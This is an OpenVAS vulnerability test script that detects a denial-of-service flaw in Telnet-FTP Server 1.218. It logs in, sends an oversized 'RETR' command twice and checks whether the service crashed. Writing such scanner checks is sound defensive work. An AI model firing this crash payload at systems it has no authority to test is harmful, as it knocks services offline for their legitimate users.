###############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_telnet_ftp_server_dos_vuln.nasl 5351 2017-02-20 08:03:12Z mwiegand $
#
# Telnet-FTP Server 'RETR' Command Remote Denial of Service Vulnerability
#
# Authors:
# Sooraj KS <kssooraj@secpod.com>
#
# Copyright:
# Copyright (c) 2012 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.902819");
  script_version("$Revision: 5351 $");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_tag(name:"last_modification", value:"$Date: 2017-02-20 09:03:12 +0100 (Mon, 20 Feb 2017) $");
  script_tag(name:"creation_date", value:"2012-03-21 16:16:16 +0530 (Wed, 21 Mar 2012)");
  script_name("Telnet-FTP Server 'RETR' Command Remote Denial of Service Vulnerability");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2012 SecPod");
  script_family("FTP");
  script_dependencies("find_service_3digits.nasl");
  script_require_ports("Services/ftp", 21);

  script_xref(name:"URL", value:"http://www.1337day.com/exploits/17779");
  script_xref(name:"URL", value:"http://www.allinfosec.com/2012/03/20/dos-poc-telnet-ftp-server-v1-218-remote-crash-poc");

  tag_impact = "Successful exploitation will allow remote attackers to crash the
  affected application, denying service to legitimate users.

  Impact Level: Application";

  tag_affected = "Telnet-Ftp Server version 1.218 and prior";

  tag_insight = "The flaw is caused due an error when handling 'RETR' command,
  which can be exploited to crash the FTP service by sending specially crafted
  FTP commands.";

  tag_solution = "No solution or patch was made available for at least one year
  since disclosure of this vulnerability. Likely none will be provided anymore.
  General solution options are to upgrade to a newer release, disable respective
  features, remove the product or replace the product by another one.";

  tag_summary = "This host is running Telnet-FTP Server and is prone to denial of
  service vulnerability.";

  script_tag(name:"impact", value:tag_impact);
  script_tag(name:"affected", value:tag_affected);
  script_tag(name:"insight", value:tag_insight);
  script_tag(name:"solution", value:tag_solution);
  script_tag(name:"summary", value:tag_summary);

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}


include("ftp_func.inc");

## Variable Initialization
soc = 0;
soc1 = 0;
pass = "";
user = "";
banner = "";
exploit = "";
ftpPort = 0;
login_details = "";

## Get the default port of FTP
ftpPort = get_kb_item("Services/ftp");
if(! ftpPort){
  ftpPort = 21;
}

## check port status
if(! get_port_state(ftpPort)){
  exit(0);
}

## Confirm the Application
banner = get_ftp_banner(port:ftpPort);
if(! banner || "Telnet-Ftp Server" >!< banner){
  exit(0);
}

## Open FTP Socket
soc = open_sock_tcp(ftpPort);
if(! soc){
  exit(0);
}

## Check for the user name and password
user = get_kb_item("ftp/login");
pass = get_kb_item("ftp/password");

## Try for anomymous user
if(! user){
  user = "anonymous";
  pass = "openvas@";
}

## Try to Login
login_details = ftp_log_in(socket:soc, user:user, pass:pass);
if(! login_details){
  exit(0);
}

## Build Exploit
exploit = "RETR " + crap(256);

## Send the Attack Request
ftp_send_cmd(socket:soc, cmd:exploit);
ftp_send_cmd(socket:soc, cmd:exploit);
ftp_close(socket:soc);

## Open the socket to confirm FTP server is alive
soc1 = open_sock_tcp(ftpPort);
if(! soc1)
{
  security_message(ftpPort);
  exit(0);
}

## Some time server will be listening, but won't respond
banner =  recv(socket:soc1, length:512);
if(! banner || "Telnet-Ftp Server" >!< banner)
{
  security_message(ftpPort);
  exit(0);
}
ftp_close(socket:soc1);
